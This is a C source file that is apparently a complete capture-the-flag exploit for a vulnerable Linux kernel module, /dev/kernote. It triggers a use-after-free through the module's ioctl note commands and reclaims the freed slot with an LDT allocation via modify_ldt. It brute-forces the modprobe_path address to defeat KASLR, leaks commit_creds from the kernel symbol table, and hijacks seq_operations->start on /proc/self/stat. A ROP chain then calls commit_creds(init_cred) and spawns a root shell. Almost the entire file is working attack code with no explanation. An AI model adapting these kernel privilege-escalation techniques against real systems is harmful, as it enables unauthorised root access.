#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <asm/ldt.h>
#include <sys/sendfile.h>
#define PAGE_SIZE 0x1000

#define logOK(msg, ...)     fprintf(stderr,"[+] " msg "\n", ##__VA_ARGS__)

#define logInfo(msg, ...)   fprintf(stderr,"[!] " msg "\n", ##__VA_ARGS__)

#define logErr(msg, ...)    fprintf(stderr,"[-] " msg "\n", ##__VA_ARGS__)

#define errExit(msg, ...)   do{ fprintf(stderr,"[-] " msg " ", ##__VA_ARGS__); perror(""); exit(-1); } while(0)

const char* binsh =  "/bin/sh" ;
char* const execve_argv[] = { "/bin/sh", NULL} ;
char* fake_stack;
void get_shell();

#define devfile "/dev/kernote"

int devfd;

void opendev(){
    devfd = open(devfile,O_RDONLY);
    if( devfd < 0){
        errExit("Can't open /dev/kernote");
    }
}

#define GET_NOTE    0x6666
#define ALLOC_NOTE  0x6667
#define FREE_NOTE   0x6668
#define WRITE_NOTE  0x6669
#define SHOW_NOTE   0x666a

int getNote(uint64_t idx){
    return ioctl(devfd,GET_NOTE,idx);
}

int allocNote(uint64_t idx){
    return ioctl(devfd,ALLOC_NOTE,idx);
}

int freeNote(uint64_t idx){
    return ioctl(devfd,FREE_NOTE,idx);
}

int writeNote(uint64_t data){
    return ioctl(devfd,WRITE_NOTE,data);
}

struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};

uint64_t _text;
uint64_t commit_creds;
uint64_t __ksymtab_commit_creds;
uint64_t init_cred;

struct user_desc u_desc;

void trigger(int stat_fd);

#define KASLR

int main(int argc,char** argv,char** envp){
    opendev();

    char rsp;
    fake_stack = &rsp;

    if(allocNote(0)){
        errExit("allocNote(0)");
    }
    logOK("Alloc buf[0]");

    if(getNote(0)){
        errExit("getNote(0)");
    }
    logOK("note = buf[0]");

    
    if(freeNote(0)){
        errExit("freeNote(0)");
    }
    logOK("Free(buf[0])");

    u_desc.entry_number=0x8000/8 ; /*
    old_ldt       = mm->context.ldt;
	old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
	new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
    */
    u_desc.seg_32bit = 1; /*
    if (!ldt_info.seg_32bit && !allow_16bit_segments()) {
			error = -EINVAL;
			goto out;
		}
    */

    if(syscall(SYS_modify_ldt,1,&u_desc,sizeof(u_desc))){
        errExit("syscall(SYS_modify_ldt,1,&u_desc,sizeof(u_desc)");
    }
    logOK("Alloc new new_nr_entries");

#ifdef KASLR
    uint64_t modprobe_path = 0xfffffffff006c140;

    char buf[15] = {0};

    for(modprobe_path ; modprobe_path >= 0xffffffff8266c140 ; modprobe_path -= 0x100000){

        if(writeNote(modprobe_path)){
            errExit("writeNote(modprobe_path)");
        }

        memset(buf,0,sizeof(buf));

        if(syscall(SYS_modify_ldt,0,buf,sizeof(buf)) < 0){
            errExit("syscall(SYS_modify_ldt,0,buf,sizeof(buf))");
        }

        if(strcmp(buf,"/sbin/modprobe") == 0)
            break;
        if((0xfffffffff006c140 - modprobe_path) % 0x1000000 == 0)
            logInfo("Scan 0x%lx", modprobe_path);
    }
    logOK("modprobe_path = 0x%lx", modprobe_path);
    _text = modprobe_path - 23511360;
#else
    _text = 0xffffffff81000000;
#endif
    init_cred = _text + 0x166b780;
    __ksymtab_commit_creds = _text + 0x14d9024;

// Prepare ROP

    struct kernel_symbol __ksymtab = {0};

    if(writeNote(__ksymtab_commit_creds)){
        errExit("writeNote(__ksymtab_commit_creds)");
    }
    logOK("new_nr_entries->desc_struct = __ksymtab_commit_creds");

    if(syscall(SYS_modify_ldt,0,&__ksymtab,sizeof(__ksymtab)) < 0){
        errExit("syscall(SYS_modify_ldt,0,&__ksymtab,sizeof(__ksymtab)");
    }

    commit_creds = __ksymtab_commit_creds + (int)__ksymtab.value_offset;

    logOK("commit_creds = 0x%lx", commit_creds);


    if(allocNote(0)){
        errExit("allocNote(0)");
    }
    logOK("Alloc buf[0]");

    if(getNote(0)){
        errExit("getNote(0)");
    }
    logOK("note = buf[0]");

    if(freeNote(0)){
        errExit("freeNote(0)");
    }
    logOK("Free(buf[0])");

    int stat_fd = open("/proc/self/stat",O_RDONLY);
    if(stat_fd < 0){
        errExit("Can't open /proc/self/stat");
    }
    logOK("Open /proc/self/stat: %d",stat_fd);

    if(writeNote(_text + 0x516ebe)){ // add rsp, 0x0000000000000180 ; mov eax, r12d ; pop rbx ; pop r12 ; pop rbp ; ret ; (1 found)
        errExit("writeNote(_text + 0x516ebe)");
    }
    logOK("Overwrite seq_operations->start");

    trigger(stat_fd);

    logErr("Shouldn't touch this");
}

void get_shell(){
    asm(
        ".intel_syntax noprefix;"
        "mov rsp, fake_stack;"
        "mov rbp, rsp;"
        "add rbp, 0x80;"
        ".att_syntax;"
    );
    if(fork() == 0){
        execve(binsh,execve_argv,NULL);
    }
    wait(NULL);
    _exit(0);
}

void trigger(int stat_fd){
    __asm__(
        ".intel_syntax noprefix;"
        "mov r15, %0 ;" // pop rdi ; ret
        "mov r14, init_cred ;" // NULL
        "mov r13, commit_creds ;"
        "mov r12, %1 ;" // pop rcx ; ret
        "lea rbp, [get_shell + 8] ;" // user_ip
        "mov rbx, %2 ;"  // pop r11 ; ret -> r11 is user_rflags
        "mov r10, %3 ;"  // syscall_return_via_sysret+24
        "mov rdx, 0x4343;"
        "mov rsi, 0x4242;"
        "xor eax, eax; "
        "syscall;"
        ".att_syntax;"
        :
        : "r" (_text + 0x75c4c), "r"(_text + 0x761da), "r"(_text + 0x7605a) , "r"(_text + 0xc00109)
    );
}